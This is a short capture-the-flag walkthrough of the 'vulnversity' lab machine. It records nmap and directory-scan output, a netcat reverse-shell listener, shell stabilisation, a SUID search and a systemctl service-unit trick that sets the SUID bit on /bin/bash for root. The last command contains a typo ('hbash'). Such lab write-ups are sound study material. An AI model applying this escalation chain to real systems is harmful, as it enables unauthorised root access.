### vulnversity
----------------------------------

IP = 10.10.61.193

#### NMAP


```
┌──(edith㉿HackBox)-[~/pwn/vuln_machines/vulnversity]
└─$ nmap -sC -sV -oN nmap/initial $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 11:13 IST
Nmap scan report for 10.10.61.193
Host is up (0.16s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-04-09T05:43:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-04-09T01:43:48-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.78 seconds


```

#### Feroxbuster

For recursive scanning 

```
└─$ feroxbuster --url  http://10.10.61.193:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -C 404 403 --depth 2                                                               
                                                                                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.61.193:3333/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      320c http://10.10.61.193:3333/images => http://10.10.61.193:3333/images/
200      GET        4l       55w     2865c http://10.10.61.193:3333/images/loc.png
200      GET       15l       51w      965c http://10.10.61.193:3333/css/owl.theme.default.min.css
200      GET       62l      191w     1946c http://10.10.61.193:3333/js/google-map.js
200      GET       32l      239w     7447c http://10.10.61.193:3333/js/scrollax.min.js
200      GET       55l      324w    28756c http://10.10.61.193:3333/images/person_9.jpg
200      GET      512l     1690w    17945c http://10.10.61.193:3333/css/bootstrap-datepicker.css
200      GET        7l      285w    15764c http://10.10.61.193:3333/js/jquery.timepicker.min.js
200      GET      180l      898w    62057c http://10.10.61.193:3333/images/person_3.jpg
200      GET      137l      843w    64169c http://10.10.61.193:3333/images/person_1.jpg
200      GET      121l      601w    44350c http://10.10.61.193:3333/images/person_4.jpg
200      GET        2l      220w    25983c http://10.10.61.193:3333/css/aos.css
200      GET        7l      152w     8835c http://10.10.61.193:3333/js/jquery.waypoints.min.js
200      GET       44l       98w      998c http://10.10.61.193:3333/js/range.js
200      GET      221l     1450w    89759c http://10.10.61.193:3333/images/person_5.jpg
200      GET      167l     1086w    83261c http://10.10.61.193:3333/images/person_2.jpg
200      GET        7l      570w    50676c http://10.10.61.193:3333/js/bootstrap.min.js
200      GET        7l      287w    43237c http://10.10.61.193:3333/js/owl.carousel.min.js
200      GET      293l     1468w    92796c http://10.10.61.193:3333/images/course-6.jpg
200      GET        5l      347w    19032c http://10.10.61.193:3333/js/popper.min.js
200      GET        2l       72w    12597c http://10.10.61.193:3333/js/jquery.stellar.min.js
200      GET        2l      284w    14244c http://10.10.61.193:3333/js/aos.js
200      GET      381l     1609w   131091c http://10.10.61.193:3333/images/course-4.jpg
200      GET      315l     1727w   139498c http://10.10.61.193:3333/images/event-6.jpg
200      GET      339l     1774w   169336c http://10.10.61.193:3333/images/course-1.jpg
200      GET      431l     1933w   151467c http://10.10.61.193:3333/images/course-2.jpg
200      GET      366l     1947w   181827c http://10.10.61.193:3333/images/event-3.jpg
200      GET      418l     1701w   157952c http://10.10.61.193:3333/images/image_3.jpg
200      GET      292l     3064w   198556c http://10.10.61.193:3333/images/person_7.jpg
200      GET      358l     2304w   196870c http://10.10.61.193:3333/images/event-1.jpg
200      GET      522l     3133w   261437c http://10.10.61.193:3333/images/image_6.jpg
200      GET      775l     4034w   319835c http://10.10.61.193:3333/images/image_5.jpg
200      GET      730l     4012w   318152c http://10.10.61.193:3333/images/event-2.jpg
200      GET     1089l     5760w   510198c http://10.10.61.193:3333/images/bg_3.jpg
200      GET     1043l     6412w   457605c http://10.10.61.193:3333/images/person_6.jpg
200      GET      553l     2819w   211209c http://10.10.61.193:3333/images/person_8.jpg
200      GET      719l     6717w   462562c http://10.10.61.193:3333/images/bg_4.jpg
200      GET    10253l    40950w   268038c http://10.10.61.193:3333/js/jquery.min.js
200      GET      698l     3936w   311367c http://10.10.61.193:3333/images/event-5.jpg
200      GET      125l     1194w    98910c http://10.10.61.193:3333/images/event-4.jpg
200      GET      278l     1407w   109682c http://10.10.61.193:3333/images/image_1.jpg
200      GET      351l      795w     6950c http://10.10.61.193:3333/css/magnific-popup.css
200      GET      205l     1368w     8111c http://10.10.61.193:3333/js/jquery.easing.1.3.js
200      GET     1598l     9778w   799181c http://10.10.61.193:3333/images/bg_2.jpg
200      GET     1671l     4509w    46820c http://10.10.61.193:3333/js/bootstrap-datepicker.js
200      GET      389l     2229w   190422c http://10.10.61.193:3333/images/image_2.jpg
200      GET      470l     2546w   215485c http://10.10.61.193:3333/images/course-3.jpg
200      GET      198l     1318w   110075c http://10.10.61.193:3333/images/course-5.jpg
301      GET        9l       28w      317c http://10.10.61.193:3333/css => http://10.10.61.193:3333/css/
200      GET      215l     1394w    11421c http://10.10.61.193:3333/js/jquery-migrate-3.0.1.min.js
200      GET        8l       28w     1391c http://10.10.61.193:3333/js/jquery.animateNumber.min.js
200      GET      308l      631w     6769c http://10.10.61.193:3333/js/main.js
200      GET        4l      212w    20216c http://10.10.61.193:3333/js/jquery.magnific-popup.min.js
200      GET     2520l    13107w  1051940c http://10.10.61.193:3333/images/bg_1.jpg
200      GET      414l     2481w   190114c http://10.10.61.193:3333/images/image_4.jpg
200      GET       11l       46w    46816c http://10.10.61.193:3333/css/ionicons.min.css
200      GET        6l       73w     3440c http://10.10.61.193:3333/css/owl.carousel.min.css
200      GET        1l        6w     9467c http://10.10.61.193:3333/css/open-iconic-bootstrap.min.css
200      GET       72l      133w     1588c http://10.10.61.193:3333/css/jquery.timepicker.css
200      GET       43l       94w     1265c http://10.10.61.193:3333/css/flaticon.css
200      GET     3377l     7494w    73641c http://10.10.61.193:3333/css/animate.css
200      GET     4919l     8218w    79875c http://10.10.61.193:3333/css/icomoon.css
200      GET      652l     2357w    33014c http://10.10.61.193:3333/index.html
200      GET       35l      179w     5340c http://10.10.61.193:3333/css/ajax-loader.gif
301      GET        9l       28w      316c http://10.10.61.193:3333/js => http://10.10.61.193:3333/js/
200      GET        4l     1298w    86658c http://10.10.61.193:3333/js/jquery-3.2.1.min.js
200      GET     9397l    25506w   252996c http://10.10.61.193:3333/css/style.css
200      GET      652l     2357w    33014c http://10.10.61.193:3333/
200      GET        7l     1604w   140421c http://10.10.61.193:3333/css/bootstrap.min.css
301      GET        9l       28w      319c http://10.10.61.193:3333/fonts => http://10.10.61.193:3333/fonts/
301      GET        9l       28w      322c http://10.10.61.193:3333/internal => http://10.10.61.193:3333/internal/
301      GET        9l       28w      330c http://10.10.61.193:3333/internal/uploads => http://10.10.61.193:3333/internal/uploads/
301      GET        9l       28w      326c http://10.10.61.193:3333/internal/css => http://10.10.61.193:3333/internal/css/
[####################] - 5m    175422/175422  0s      found:73      errors:33     
[####################] - 5m     87650/87650   282/s   http://10.10.61.193:3333/ 
[####################] - 5s     87650/87650   16472/s http://10.10.61.193:3333/images/ => Directory listing
[####################] - 8s     87650/87650   10781/s http://10.10.61.193:3333/css/ => Directory listing
[####################] - 7s     87650/87650   13266/s http://10.10.61.193:3333/js/ => Directory listing
[####################] - 0s     87650/87650   260089/s http://10.10.61.193:3333/fonts/ => Directory listing
[####################] - 5m     87650/87650   287/s   http://10.10.61.193:3333/internal/


```

#### Reverse shell

```
nc -nvlp 8080

```
#### Stablise the shell

```
python -c "import pty; pty.spawn('/bin/bash');"
export TERM=xterm
^z
stty raw -echo; fg
```

#### Privilege escalation

Find SUID bit set file

```
find /  -perm -4000 2>/dev/null
```
#### Check ctfo bin website

```

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash" 
[Install]
WantedBy=multi-user.target' > $TF

```

systemctl link $TF
systemctl enable --now $TF

> Run it!

```
/bin/hbash -p
```	